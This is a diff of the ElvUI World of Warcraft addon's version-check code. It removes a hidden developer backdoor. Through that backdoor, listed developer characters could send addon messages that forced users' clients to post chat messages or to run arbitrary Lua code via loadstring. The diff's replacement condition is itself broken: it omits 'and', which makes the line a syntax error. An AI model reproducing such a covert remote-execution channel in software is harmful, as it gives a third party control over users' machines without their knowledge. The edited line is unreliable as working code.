@@ -403,36 +403,15 @@ end
 local myName = E.myname..'-'..E.myrealm;
 myName = myName:gsub('%s+', '');
 local frames = {};
-local devAlts = {
-	['Elv-ShatteredHand'] = true,
-	['Sarah-ShatteredHand'] = true,
-	['Sara-ShatteredHand'] = true,
-};
 
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if(event == 'CHAT_MSG_ADDON') then
 		if(sender == myName) then return; end
-		if(prefix == 'ELVUI_VERSIONCHK' and devAlts[myName] ~= true and not E.recievedOutOfDateMessage) then
+		if(prefix == 'ELVUI_VERSIONCHK' not E.recievedOutOfDateMessage) then
 			if(tonumber(message) ~= nil and tonumber(message) > tonumber(E.version)) then
 				E:Print(L['ElvUI is out of date. You can download the newest version from www.tukui.org. Get premium membership and have ElvUI automatically updated with the Tukui Client!']);
 				E:StaticPopup_Show('ELVUI_UPDATE_AVAILABLE');
 				E.recievedOutOfDateMessage = true;
-			end
-		elseif((prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and devAlts[sender] == true and devAlts[myName] ~= true) then
-			if(prefix == 'ELVUI_DEV_SAYS') then
-				local user, channel, msg, sendTo = split('#', message);
-				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
-					SendChatMessage(msg, channel, nil, sendTo);
-				end
-			else
-				local user, executeString = split('#', message);
-				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
-					local func, err = loadstring(executeString);
-					if(not err) then
-						E:Print(format('Developer Executed: %s', executeString));
-						func();
-					end
-				end
 			end
 		end
 	else
